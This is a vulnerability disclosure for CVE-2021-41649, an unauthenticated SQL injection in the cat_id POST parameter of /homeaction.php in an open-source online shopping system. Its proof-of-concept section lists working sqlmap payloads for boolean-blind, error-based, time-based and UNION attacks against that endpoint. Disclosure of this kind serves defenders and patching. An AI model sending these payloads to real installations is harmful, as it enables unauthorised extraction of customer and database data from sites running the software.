# CVE-2021-41649

CVE-2021-41649 SQL Injection in online-shopping-system

The online-shopping-system is vulnerable to un-authenticated error/boolean-based blind & error based SQL Injection attacks.  <br/><br/>
The cat_id parameter on the /homeaction.php page does not sanitize the user input, an attacker can extract sensisitive data from the underlying MySQL Database.  <br/><br/> 

## Link To Application
[online-shopping-system](https://awesomeopensource.com/project/PuneethReddyHC/online-shopping-system)

## Affected Components & Parameter
URL: **/homeaction.php**  
PARAMETER: **cat_id**<br/><br/>

## Poc's

### SQLMAP PAYLOADS<br/>
### cat_id parameter on the /homeaction.php page
Parameter: cat_id (POST Request)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: `cat_id=4' AND 9760=9760 AND 'ZCfc'='ZCfc&get_seleted_Category=1`

Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: `cat_id=4' AND (SELECT 4034 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT (ELT(4034=4034,1))),0x71787a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'sGIO'='sGIO&get_seleted_Category=1`

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: `cat_id=4' AND (SELECT 9762 FROM (SELECT(SLEEP(5)))PAcf) AND 'hpHO'='hpHO&get_seleted_Category=1`

Type: UNION query
Title: Generic UNION query (NULL) - 10 columns
Payload: `cat_id=4' UNION ALL SELECT CONCAT(0x71707a7171,0x746e4d4b5a706566596771585179566943487446575673515244507a52507345694d6b5a754d7049,0x71787a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&get_seleted_Category=1`</br></br>

### If the POC Image is unclear, please click on the GIF which will load in a better resolution.

![ POC - proId ](https://github.com/MobiusBinary/F2/blob/main/online-shopping-systemcatID.gif) 


## Discovered by
Jason Colyvas  
[MOBIUSBINARY](https://mobiusbinary.com)  
September 21st, 2021
